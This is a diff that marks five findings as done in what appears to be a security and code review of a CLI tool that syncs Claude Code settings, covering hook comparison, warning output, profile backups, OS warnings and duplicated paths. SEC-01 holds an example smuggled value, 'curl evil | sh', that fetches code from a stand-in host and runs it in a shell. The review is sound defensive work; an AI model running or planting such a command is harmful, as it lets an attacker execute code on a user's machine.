@@ -70,7 +70,7 @@ Both need a setup forged with the user's own data key (threat 13: one of the use
 
 #### SEC-01 · Low · A hook that changes between "program plus arguments" and "one shell command" is not shown as changed
 
-- [ ] **Where:** `packages/cli/src/agents/claude-code/command-review.ts:110-112`
+- [x] **Where:** `packages/cli/src/agents/claude-code/command-review.ts:110-112`
 - **Problem:** A hook entry is shown and compared as `[command, ...args].join(' ')`. `{command: 'tool', args: ['a b; curl evil | sh']}` (one argument, no shell) and `{command: 'tool a b; curl evil | sh'}` (a shell command line) give the same text, so `reviewRunnable` returns nothing when a setup swaps one for the other. Reproduced with a probe against the real function: `[]` both ways.
 - **Why it matters:** The exec form passes the text as data; the shell form runs it. A forged setup can turn a harmless argument already on this PC into a command, and `pull --yes` without `--allow-commands` accepts it unshown.
 - **Fix:** Compare the exec form by a stable form of `{command, args}` (for example its JSON), and show each argument quoted so the two forms never print the same. Add a test for the swap in both directions.
@@ -79,7 +79,7 @@ Both need a setup forged with the user's own data key (threat 13: one of the use
 
 #### SEC-02 · Low · Restore warnings print file paths with line breaks as they are
 
-- [ ] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:320`, `:339`, `:391`, `:403` (and the warning in `claude-json-merge.ts`); printed at `packages/cli/src/pull/pull-command.ts:516`; `packages/contracts/src/bundle.ts:60-64` allows `\n` in a path
+- [x] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:320`, `:339`, `:391`, `:403` (and the warning in `claude-json-merge.ts`); printed at `packages/cli/src/pull/pull-command.ts:516`; `packages/contracts/src/bundle.ts:60-64` allows `\n` in a path
 - **Problem:** The restorer puts `file.path` into `report.warnings`; `reporter.warn` passes it through `printable()`, which keeps line breaks. A path with a line break can therefore print its own fake line under a warning. This is the rest of review 5's SEC-04, which fixed the other places.
 - **Why it matters:** A forged setup can make the output show a reassuring or misleading line ("✔ Restored …") in the middle of the warnings.
 - **Fix:** Build the warnings with the one-line form already used elsewhere for paths (the helper SEC-04 added), or have `warn` take the path separately. Add a restorer test with a path holding `\n`.
@@ -90,7 +90,7 @@ Both need a setup forged with the user's own data key (threat 13: one of the use
 
 #### BUG-01 · Low · Two profile backups in the same second: the second replaces the first
 
-- [ ] **Where:** `packages/cli/src/env/shell-profile.ts:152-156`
+- [x] **Where:** `packages/cli/src/env/shell-profile.ts:152-156`
 - **Problem:** The backup name carries a time stamp to the second and is written with a plain `writeFile`. A pull that writes environment values for two setups (global and a project) within one second writes the second backup over the first. The first backup held the profile as it was before agentnomad touched it. The restorer already avoids this with `freeSuffix` (T45).
 - **Why it matters:** The one copy of the user's original shell profile can be lost; it is the copy they would need if the block went wrong.
 - **Fix:** Pick a free name the way the restorer does (share `freeSuffix` from one place), or write with the `wx` flag and add a counter. Add a test: two writes with the same clock leave two backups.
@@ -119,7 +119,7 @@ Both need a setup forged with the user's own data key (threat 13: one of the use
 
 #### UX-02 · Low · False "this hook is for another OS" warnings
 
-- [ ] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:121-126` (`hooksForOtherOs`)
+- [x] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:121-126` (`hooksForOtherOs`)
 - **Problem:** Every word of a hook command is tested against shell names. `echo "use bash here"` and `git log -1 --format="%s by sh"` warn on Windows; `notify "ran cmd"` warns on Linux. The warning also prints the words without their quotes. Reproduced with a probe.
 - **Why it matters:** A warning that is often wrong teaches the user to ignore it, and the printed command is not the one in their settings.
 - **Fix:** Test only the program word and words that end in a script extension; print the command as written. Add the three cases as tests.
@@ -139,7 +139,7 @@ Both need a setup forged with the user's own data key (threat 13: one of the use
 
 #### DUP-01 · Low · The project settings file paths are written in four places
 
-- [ ] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:273`, `:413`; `packages/cli/src/agents/claude-code/project-collector.ts:111`; `packages/cli/src/agents/claude-code/env-files.ts` (`SETTINGS_FILES`)
+- [x] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:273`, `:413`; `packages/cli/src/agents/claude-code/project-collector.ts:111`; `packages/cli/src/agents/claude-code/env-files.ts` (`SETTINGS_FILES`)
 - **Problem:** `.claude/settings.json` and `.claude/settings.local.json` are literals in each place.
 - **Why it matters:** A new settings file name has to be added in four files; missing one means push and pull disagree.
 - **Fix:** Export one list from `project-paths.ts` (or the data file) and use it in all four.
